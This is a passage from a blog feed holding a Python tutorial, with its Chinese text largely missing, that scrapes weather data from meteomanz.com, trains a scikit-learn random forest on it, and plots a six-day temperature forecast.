class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: GetData.py</span></span><br><span class="line"><span class="comment"># : </span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GetData</span>:</span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    headers = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, header=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param url: </span></span><br><span class="line"><span class="string">        :param header: </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.url = url</span><br><span class="line">        <span class="keyword">if</span> header == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="variable language_">self</span>.headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                          <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, &#x27;</span></span><br><span class="line">                              <span class="string">&#x27;like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36 &#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.meteomanz.com&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.headers = header</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        http = urllib3.PoolManager()</span><br><span class="line">        <span class="keyword">return</span> http.request(<span class="string">&#x27;GET&#x27;</span>, <span class="variable language_">self</span>.url, headers=<span class="variable language_">self</span>.headers).data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>20</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">   <span class="comment">#  [1,1], [20, 0]2019202019</span></span><br><span class="line">   <span class="comment"># csv</span></span><br><span class="line">   Write([<span class="number">1</span>, <span class="number">1</span>], [<span class="number">20</span>, <span class="number">0</span>], <span class="string">&quot;weather_train_train.csv&quot;</span>)</span><br></pre></td></tr></table></figure><p><br><code>weather_train_train.csv</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Time,Ave_t,Max_t,Min_t,Prec,SLpress,Winddir,Windsp,Cloud</span><br><span class="line"></span><br><span class="line">07/12/2019,14.8,20.8,8.8,0.0,1026.3,331,11,0</span><br><span class="line">06/12/2019,15.2,19.8,10.7,0.0,1026.6,344,15,0</span><br><span class="line">05/12/2019,14.5,20.4,8.6,2,1026.2,346,13,8</span><br><span class="line">04/12/2019,13.8,20.4,7.1,0.0,1024.7,335,16,2</span><br><span class="line">03/12/2019,13.0,18.9,7.1,0.0,1024.8,330,10,0</span><br><span class="line">02/12/2019,18.2,24.9,11.5,0.0,1024.8,347,18,3</span><br><span class="line">01/12/2019,18.1,24.9,11.4,0.0,1020.9,332,16,1</span><br><span class="line">30/11/2019,17.5,23.6,11.4,0.0,1020.5,352,8,3</span><br><span class="line">29/11/2019,15.8,20.1,11.5,0.0,1023.6,349,11,4</span><br><span class="line">28/11/2019,20.4,27.1,13.8,0.0,1024.5,337,19,3</span><br><span class="line">27/11/2019,21.9,27.1,16.6,0.0,1021.3,336,12,0</span><br><span class="line">26/11/2019,22.2,28.4,16.1,0.0,1021.1,356,6,6</span><br><span class="line">25/11/2019,22.2,29.3,15.2,0.0,1020.8,344,13,3</span><br><span class="line">24/11/2019,21.4,29.3,13.6,0.0,1018.5,346,5,0</span><br><span class="line">23/11/2019,20.7,28.4,13.0,0.0,1017.2,352,5,1</span><br><span class="line">22/11/2019,19.6,27.6,11.6,0.0,1017.3,331,6,0</span><br><span class="line">21/11/2019,18.4,25.1,11.6,0.0,1019.1,323,9,1</span><br><span class="line">20/11/2019,18.3,24.2,12.4,0.0,1020.3,338,7,0</span><br><span class="line">19/11/2019,19.1,25.4,12.8,0.0,1020.5,342,11,0</span><br><span class="line">18/11/2019,22.2,28.8,15.7,0.0,1018.8,342,17,0</span><br><span class="line">17/11/2019,22.2,28.8,15.7,0.0,1015.2,358,7,3</span><br></pre></td></tr></table></figure><h2 id="6-"><a href="#6-" class="headerlink" title="6."></a>6.</h2><p></p><p>2</p><p><code>ProcessData.py</code><code>ProcessData</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: ProcessData.py</span></span><br><span class="line"><span class="keyword">from</span> Write <span class="keyword">import</span> Write</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.impute <span class="keyword">import</span> SimpleImputer</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># : </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ProcessData</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        [X_train X,</span></span><br><span class="line"><span class="string">        X_valid X,</span></span><br><span class="line"><span class="string">        y_train Y,</span></span><br><span class="line"><span class="string">        y_valid Y,</span></span><br><span class="line"><span class="string">        imputed_X_test ]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="comment">#  [1,1], [20, 0]2019202019</span></span><br><span class="line">    <span class="comment"># csv</span></span><br><span class="line">    Write([<span class="number">1</span>, <span class="number">1</span>], [<span class="number">20</span>, <span class="number">0</span>], <span class="string">&quot;weather_train_train.csv&quot;</span>)</span><br><span class="line">    Write([<span class="number">1</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">20</span>], <span class="string">&quot;weather_train_valid.csv&quot;</span>)</span><br><span class="line">    Write([<span class="number">0</span>, <span class="number">0</span>], [<span class="number">20</span>, <span class="number">0</span>], <span class="string">&quot;weather_test.csv&quot;</span>)</span><br><span class="line">    X_test = pd.read_csv(<span class="string">&quot;weather_test.csv&quot;</span>, index_col=<span class="string">&quot;Time&quot;</span>, parse_dates=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    X = pd.read_csv(<span class="string">&quot;weather_train_train.csv&quot;</span>, index_col=<span class="string">&quot;Time&quot;</span>, parse_dates=<span class="literal">True</span>)</span><br><span class="line">    y = pd.read_csv(<span class="string">&quot;weather_train_valid.csv&quot;</span>, index_col=<span class="string">&quot;Time&quot;</span>, parse_dates=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># dropMAE=3.7</span></span><br><span class="line">    <span class="comment"># dxtcol = [col for col in X_test.columns</span></span><br><span class="line">    <span class="comment">#           if X_test[col].isnull().all()]</span></span><br><span class="line">    <span class="comment"># dxcol = [col for col in X.columns</span></span><br><span class="line">    <span class="comment">#          if X[col].isnull().all()]</span></span><br><span class="line">    <span class="comment"># dycol = [col for col in y.columns</span></span><br><span class="line">    <span class="comment">#          if y[col].isnull().all()]</span></span><br><span class="line">    <span class="comment"># for a1 in [dxtcol, dxcol, dycol]:</span></span><br><span class="line">    <span class="comment">#     for a2 in a1:</span></span><br><span class="line">    <span class="comment">#         if a2 in X_test.columns:</span></span><br><span class="line">    <span class="comment">#             X_test = X_test.drop(a2, axis=1)</span></span><br><span class="line">    <span class="comment">#         if a2 in X.columns:</span></span><br><span class="line">    <span class="comment">#             X = X.drop(a2, axis=1)</span></span><br><span class="line">    <span class="comment">#         if a2 in y.columns:</span></span><br><span class="line">    <span class="comment">#             y = y.drop(a2, axis=1)</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="comment"># scaler = preprocessing.StandardScaler()</span></span><br><span class="line">    <span class="comment"># pars = [cols for cols in X.columns if cols != &quot;Time&quot;]</span></span><br><span class="line">    <span class="comment"># for data in [X, y, X_test]:</span></span><br><span class="line">    <span class="comment">#     for par in pars:</span></span><br><span class="line">    <span class="comment">#         data[par] = scaler.fit_transform(data[par].values.reshape(-1, 1))</span></span><br><span class="line">    <span class="comment">#         # temp = scaler.fit(data[par].values.reshape(-1, 1))</span></span><br><span class="line">    <span class="comment">#         # data[par] = scaler.fit_transform(data[par].values.reshape(-1, 1), temp)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    my_imputer = SimpleImputer()</span><br><span class="line">    X_train, X_valid, y_train, y_valid = train_test_split(X, y, train_size=<span class="number">0.8</span>, test_size=<span class="number">0.2</span>, random_state=<span class="number">0</span>)</span><br><span class="line">    imputed_X_train = pd.DataFrame(my_imputer.fit_transform(X_train))</span><br><span class="line">    imputed_X_valid = pd.DataFrame(my_imputer.transform(X_valid))</span><br><span class="line">    imputed_X_train.columns = X_train.columns</span><br><span class="line">    imputed_X_valid.columns = X_valid.columns</span><br><span class="line">    imputed_y_train = pd.DataFrame(my_imputer.fit_transform(y_train))</span><br><span class="line">    imputed_y_valid = pd.DataFrame(my_imputer.transform(y_valid))</span><br><span class="line">    imputed_y_train.columns = y_train.columns</span><br><span class="line">    imputed_y_valid.columns = y_valid.columns</span><br><span class="line">    imputed_X_test = pd.DataFrame(my_imputer.fit_transform(X_test))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="comment"># sns.lineplot(data=X)</span></span><br><span class="line">    <span class="comment"># plt.show()</span></span><br><span class="line">    <span class="comment"># sns.lineplot(data=y)</span></span><br><span class="line">    <span class="comment"># plt.show()</span></span><br><span class="line">    <span class="comment"># sns.lineplot(data=X_test)</span></span><br><span class="line">    <span class="comment"># plt.show()</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">return</span> [imputed_X_train, imputed_X_valid, imputed_y_train, imputed_y_valid, imputed_X_test]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-"><a href="#7-" class="headerlink" title="7."></a>7.</h2><h3 id="7-1"><a href="#7-1" class="headerlink" title="7.1"></a>7.1</h3><h4 id="7-1-1-"><a href="#7-1-1-" class="headerlink" title="7.1.1 "></a>7.1.1 </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor <span class="comment"># </span></span><br><span class="line"><span class="keyword">import</span> joblib <span class="comment"># pkl</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_absolute_error <span class="comment"># MAE</span></span><br><span class="line"><span class="keyword">from</span> ProcessData <span class="keyword">import</span> ProcessData <span class="comment"># </span></span><br></pre></td></tr></table></figure><h4 id="7-1-2-"><a href="#7-1-2-" class="headerlink" title="7.1.2 "></a>7.1.2 </h4><p>RGBRandomForest</p><h4 id="7-1-3-"><a href="#7-1-3-" class="headerlink" title="7.1.3 "></a>7.1.3 </h4><p>MAEmean_absolute_error </p><h4 id="7-1-4-"><a href="#7-1-4-" class="headerlink" title="7.1.4 "></a>7.1.4 </h4><p><code>ProcessData()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">    [X_train, X_valid, y_train, y_valid, X_test] = ProcessData()</span><br></pre></td></tr></table></figure><h3 id="7-2"><a href="#7-2" class="headerlink" title="7.2"></a>7.2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># XGBbug</span></span><br><span class="line">   <span class="comment"># modelX = XGBRegressor(n_estimators=1000, learning_rate=0.05, random_state=0, n_jobs=4)</span></span><br><span class="line">   <span class="comment"># # model.fit(X_train_3, y_train_3)</span></span><br><span class="line">   <span class="comment"># # model.fit(X_train_2, y_train_2)</span></span><br><span class="line">   <span class="comment"># col = [&quot;Ave_t&quot;, &quot;Max_t&quot;, &quot;Min_t&quot;, &quot;Prec&quot;,&quot;SLpress&quot;, &quot;Winddir&quot;, &quot;Windsp&quot;, &quot;Cloud&quot;]</span></span><br><span class="line">   <span class="comment"># modelX.fit(X_train, y_train,</span></span><br><span class="line">   <span class="comment">#           early_stopping_rounds=5,</span></span><br><span class="line">   <span class="comment">#           eval_set=[(X_valid, y_valid)],</span></span><br><span class="line">   <span class="comment">#           verbose=False)</span></span><br><span class="line">   <span class="comment"># </span></span><br><span class="line">   model = RandomForestRegressor(random_state=<span class="number">0</span>, n_estimators=<span class="number">1001</span>)</span><br><span class="line">   <span class="comment"># </span></span><br><span class="line">   model.fit(X_train, y_train)</span><br></pre></td></tr></table></figure><p>n_estimators1001MAE</p><h3 id="7-3-"><a href="#7-3-" class="headerlink" title="7.3 "></a>7.3 </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MAE</span></span><br><span class="line">   score = mean_absolute_error(y_valid, preds)</span><br></pre></td></tr></table></figure><h3 id="7-4-joblib"><a href="#7-4-joblib" class="headerlink" title="7.4 joblib"></a>7.4 joblib</h3><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">joblib.dump(model, a)</span><br></pre></td></tr></table></figure><h3 id="7-5-"><a href="#7-5-" class="headerlink" title="7.5 "></a>7.5 </h3><p><code>GetModel.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: GetModel.py</span></span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor</span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_absolute_error</span><br><span class="line"><span class="keyword">from</span> ProcessData <span class="keyword">import</span> ProcessData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetModel</span>(<span class="params">a=<span class="string">&quot;Model.pkl&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param a: </span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        [socre: MAE,</span></span><br><span class="line"><span class="string">        X_test: ]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    [X_train, X_valid, y_train, y_valid, X_test] = ProcessData()</span><br><span class="line">    <span class="comment"># XGBbug</span></span><br><span class="line">    <span class="comment"># modelX = XGBRegressor(n_estimators=1000, learning_rate=0.05, random_state=0, n_jobs=4)</span></span><br><span class="line">    <span class="comment"># # model.fit(X_train_3, y_train_3)</span></span><br><span class="line">    <span class="comment"># # model.fit(X_train_2, y_train_2)</span></span><br><span class="line">    <span class="comment"># col = [&quot;Ave_t&quot;, &quot;Max_t&quot;, &quot;Min_t&quot;, &quot;Prec&quot;,&quot;SLpress&quot;, &quot;Winddir&quot;, &quot;Windsp&quot;, &quot;Cloud&quot;]</span></span><br><span class="line">    <span class="comment"># modelX.fit(X_train, y_train,</span></span><br><span class="line">    <span class="comment">#           early_stopping_rounds=5,</span></span><br><span class="line">    <span class="comment">#           eval_set=[(X_valid, y_valid)],</span></span><br><span class="line">    <span class="comment">#           verbose=False)</span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    model = RandomForestRegressor(random_state=<span class="number">0</span>, n_estimators=<span class="number">1001</span>)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    model.fit(X_train, y_train)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    preds = model.predict(X_valid)</span><br><span class="line">    <span class="comment"># MAE</span></span><br><span class="line">    score = mean_absolute_error(y_valid, preds)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    joblib.dump(model, a)</span><br><span class="line">    <span class="comment"># MAE</span></span><br><span class="line">    <span class="keyword">return</span> [score, X_test]</span><br></pre></td></tr></table></figure><h2 id="8-"><a href="#8-" class="headerlink" title="8 "></a>8 </h2><h3 id="8-1-"><a href="#8-1-" class="headerlink" title="8.1 "></a>8.1 </h3><p><br><code>Main.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: Main.py</span></span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">import</span> datetime <span class="keyword">as</span> DT</span><br><span class="line"><span class="keyword">from</span> GetModel <span class="keyword">import</span> GetModel</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># MAE</span></span><br><span class="line">r = GetModel()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;MAE:&quot;</span>, r[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">model = joblib.load(<span class="string">&#x27;Model.pkl&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">preds = model.predict(r[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># bug</span></span><br><span class="line"><span class="comment"># for cols in range(0, len(preds)):</span></span><br><span class="line"><span class="comment">#     preds[cols] = scaler.inverse_transform(preds[cols])</span></span><br><span class="line"><span class="comment"># sns.lineplot(data=preds)</span></span><br><span class="line"><span class="comment"># plt.show()</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;7&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(preds)</span><br><span class="line">all_ave_t = []</span><br><span class="line">all_high_t = []</span><br><span class="line">all_low_t = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">    today = DT.datetime.now()</span><br><span class="line">    time = (today + DT.timedelta(days=a)).date()</span><br><span class="line">    <span class="built_in">print</span>(time.year, <span class="string">&#x27;/&#x27;</span>, time.month, <span class="string">&#x27;/&#x27;</span>, time.day,</span><br><span class="line">          <span class="string">&#x27;: &#x27;</span>,  preds[a][<span class="number">0</span>],</span><br><span class="line">          <span class="string">&#x27;&#x27;</span>, preds[a][<span class="number">1</span>],</span><br><span class="line">          <span class="string">&#x27;&#x27;</span>, preds[a][<span class="number">2</span>],</span><br><span class="line">          <span class="string">&quot;&quot;</span>, preds[a][<span class="number">3</span>],</span><br><span class="line">          <span class="string">&quot;&quot;</span>, preds[a][<span class="number">4</span>])</span><br><span class="line">    all_ave_t.append(preds[a][<span class="number">0</span>])</span><br><span class="line">    all_high_t.append(preds[a][<span class="number">1</span>])</span><br><span class="line">    all_low_t.append(preds[a][<span class="number">2</span>])</span><br><span class="line">temp = &#123;<span class="string">&quot;ave_t&quot;</span>: all_ave_t, <span class="string">&quot;high_t&quot;</span>: all_high_t, <span class="string">&quot;low_t&quot;</span>: all_low_t&#125;</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>), temp[<span class="string">&quot;ave_t&quot;</span>], color=<span class="string">&quot;green&quot;</span>, label=<span class="string">&quot;ave_t&quot;</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>), temp[<span class="string">&quot;high_t&quot;</span>], color=<span class="string">&quot;red&quot;</span>, label=<span class="string">&quot;high_t&quot;</span>)</span><br><span class="line">plt.plot(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>), temp[<span class="string">&quot;low_t&quot;</span>], color=<span class="string">&quot;blue&quot;</span>, label=<span class="string">&quot;low_t&quot;</span>)</span><br><span class="line">plt.legend()  <span class="comment"># </span></span><br><span class="line">plt.ylabel(<span class="string">&quot;Temperature(C)&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;day&quot;</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-2-"><a href="#8-2-" class="headerlink" title="8.2 "></a>8.2 </h3><p>pythonpre_weather&#x2F;Main.py</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pre_weather/Main.py</span><br></pre></td></tr></table></figure><p></p><p>pythonjoblib</p><p>(PS: )</p><p>(Main.py11):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">model = joblib.load(<span class="string">&#x27;Model.pkl&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">preds = model.predict(r[<span class="number">1</span>])</span><br><span class="line">r[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p></p><p><code>Main.py</code></p><h2 id="9-"><a href="#9-" class="headerlink" title="9 "></a>9 </h2><p><img src="/images/%E7%94%A8python-sklearn-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%AE%9E%E7%8E%B0%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5.md-6.png" alt=""></p><blockquote><p><a href="https://github.com/Nambers/PYWeatherReport">github:PYWeatherReport</a>github</p></blockquote><center>-END-</center>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Sklearn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html+css+js</title>
      <link href="/2020/01/26/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B/"/>
      <url>/2020/01/26/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B/</url>
      
